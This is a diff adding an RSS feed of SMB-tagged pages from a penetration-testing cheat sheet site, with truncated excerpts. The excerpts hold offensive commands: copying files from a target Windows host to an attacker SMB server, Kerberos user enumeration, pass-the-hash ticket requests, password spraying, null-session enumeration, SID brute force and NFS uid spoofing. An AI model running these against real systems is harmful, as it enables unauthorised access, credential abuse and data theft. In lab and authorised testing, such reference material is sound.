@@ -1,0 +1,60 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Smb on TLDRBins</title>
+    <link>https://tldrbins.github.io/@smb/</link>
+    <description>Recent content in Smb on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@smb/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>File Transfer (Windows To Linux)</title>
+      <link>https://tldrbins.github.io/file_transfer_windows_to_linux/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/file_transfer_windows_to_linux/</guid>
+      <description>SMB Start a Local SMB Server impacket-smbserver share . -smb2support cmd # Connect to SMB server without creds net use \\10.10.14.10\share # Connect to SMB server with creds net use \\10.10.14.10\share /u:&amp;lt;USER&amp;gt; &amp;lt;PASSWORD&amp;gt; # From target Windows to local Linux copy example.txt \\10.10.14.10\share # From local Linux to target Windows copy \\10.10.14.10\share\example.txt example.txt # Delete file del example.txt # Remove SMB share net use /d \\10.10.14.10\share # Older Windows (e.</description>
+    </item>
+    <item>
+      <title>Host a SMB Server</title>
+      <link>https://tldrbins.github.io/smb_server/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/smb_server/</guid>
+      <description> Start a SMB Server for File Transfer Common Use impacket-smbserver share . -smb2support With Creds impacket-smbserver share . -smb2support -username &amp;lt;USER&amp;gt; -password &amp;lt;PASSWORD&amp;gt; Note: Sometimes smb server with creds may not work&#xA;For older Windows Machines impacket-smbserver share . </description>
+    </item>
+    <item>
+      <title>Kerberos</title>
+      <link>https://tldrbins.github.io/kerberos/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/kerberos/</guid>
+      <description>Kerbrute kerbrute&#xA;kerbrute userenum --domain &amp;lt;DOMAIN&amp;gt; --dc &amp;lt;DC&amp;gt; usernames.txt Usernames generator username-anarchy&#xA;./username-anarchy -i users.txt | tee usernames.txt Generate Kerberos Ticket (From Linux) Method #1: Using impacket sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-getTGT -hashes :&amp;lt;HASH&amp;gt; &amp;lt;DOMAIN&amp;gt;/administrator export KRB5CCNAME=administrator.ccache # Check ticket klist Method #2 : Using kinit # Step 0: Installation sudo apt install krb5-user cifs-utils # Step 1: Add domain controller to &amp;#39;/etc/hosts&amp;#39; (Try different order if not work) 10.</description>
+    </item>
+    <item>
+      <title>Mount Share</title>
+      <link>https://tldrbins.github.io/share_mount/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/share_mount/</guid>
+      <description>NFS List share showmount -e 10.10.11.10 Mount share sudo mount -t nfs 10.10.11.10:/share /mnt/share/ Unmount share sudo umount /mnt/share/ Others # Check all mounted drives mount # Check how shares are mounted cat /etc/exports +-----------------------------------------------------------------------------------------+ | root_squash : running as root on local system will be treated as nobody user in target | | no_all_squash: every other users permission will translate from local system to target | +-----------------------------------------------------------------------------------------+ # Add dummy user sudo useradd dummy # Change uid sudo usermod -u 1001 dummy # Switch to dummy user sudo su dummy -c bash SMB Mount share sudo mount -t cifs //10.</description>
+    </item>
+    <item>
+      <title>NetExec (nxc)</title>
+      <link>https://tldrbins.github.io/nxc/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/nxc/</guid>
+      <description>nxc Download nxc&#xA;Basic Commands # Single user and password nxc smb 10.10.11.10 -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; # Single user and password (Active Directory) nxc smb -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -d &amp;lt;DOMAIN&amp;gt; -dc-ip &amp;lt;DC_IP&amp;gt; # Multiple users or passwords nxc smb -u usernames.txt -p &amp;lt;PASSWORD&amp;gt; -d &amp;lt;DOMAIN&amp;gt; -dc-ip &amp;lt;DC_IP&amp;gt; --continue-on-success # Match username to corresponding password nxc smb 10.10.11.10 -u usernames.txt -p passwords.txt --no-bruteforce --continue-on-success # With LM Hash:NT Hash nxc smb 10.</description>
+    </item>
+    <item>
+      <title>RPC</title>
+      <link>https://tldrbins.github.io/rpc/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/rpc/</guid>
+      <description> rpcclient # Connect without creds rpcclient -U &amp;#39;&amp;#39; -N 10.10.11.10 # Connect with creds rpcclient -U &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt; 10.10.11.10 # Inline execute command rpcclient -U &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt; 10.10.11.10 -c &amp;#39;querydispinfo&amp;#39; Basic Commands # General info querydispinfo # List of users enumdomusers # List of groups enumdomgroups # Query group by rid querygroup &amp;lt;RID&amp;gt; # Query group member by rid querygroupmem &amp;lt;RID&amp;gt; # Query user by rid queryuser &amp;lt;RID&amp;gt; # Look up a user lookupnames &amp;lt;USER&amp;gt; # Look up by SID lookupsids &amp;lt;SID&amp;gt; impacket-lookupsid impacket-lookupsid &amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt; </description>
+    </item>
+    <item>
+      <title>SMB Enum</title>
+      <link>https://tldrbins.github.io/smb_enum/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/smb_enum/</guid>
+      <description>SMB Share Enum nmap script sudo nmap --script=smb-enum-shares -p 445 &amp;lt;TARGET&amp;gt; Login without password smbmap smbmap -H &amp;lt;TARGET&amp;gt; --no-banner smbmap -H &amp;lt;TARGET&amp;gt; -u null --no-banner # List known share smbmap -H &amp;lt;TARGET&amp;gt; -r &amp;lt;SHARE&amp;gt; smbclient smbclient -N -L \\\\&amp;lt;TARGET&amp;gt;\\ # After found an accessible share smbclient -N \\\\&amp;lt;TARGET&amp;gt;\\&amp;lt;SHARE&amp;gt;\\ # Fix: Unable to initialize messaging context. protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED smbclient -N -L \\\\&amp;lt;TARGET&amp;gt;\\ --option=&amp;#39;client min protocol=NT1&amp;#39; Login with password smbmap smbmap -H &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; # List known share smbmap -H &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -R &amp;lt;SHARE&amp;gt; # Download file smbmap -H &amp;lt;TARGET&amp;gt; -r &amp;lt;SHARE&amp;gt; --download &amp;lt;PATH/TO/FILE&amp;gt; # List files with regex pattern smbmap -H &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -r &amp;lt;SHARE&amp;gt; -A &amp;lt;FILE_PATTERN&amp;gt; smbclient smbclient -L \\\\&amp;lt;TARGET&amp;gt;\\ -U &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt; # After found an accessible share smbclient \\\\&amp;lt;TARGET&amp;gt;\\&amp;lt;SHARE&amp;gt;\\ -U &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt; smbclient Basic Commands # List all files in a share recurse ON ls # Download all files mask &amp;#34;&amp;#34; recurse ON prompt OFF mget * impacket-smbclient (Kerberos) impacket-smbclient &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET_DOMAIN&amp;gt; -k -no-pass SID Brute # Null auth allowed impacket-lookupsid test@&amp;lt;DOMAIN&amp;gt; -no-pass Mount SMB Share sudo mount -t cifs //&amp;lt;TARGET&amp;gt;/&amp;lt;SHARE&amp;gt; /mnt # With creds sudo mount -t cifs -o ro,user=&amp;lt;USER&amp;gt;,password=&amp;lt;PASSWORD&amp;gt; //&amp;lt;TARGET&amp;gt;/&amp;lt;SHARE&amp;gt; /mnt Check write permission sudo find .</description>
+    </item>
+  </channel>
+</rss>
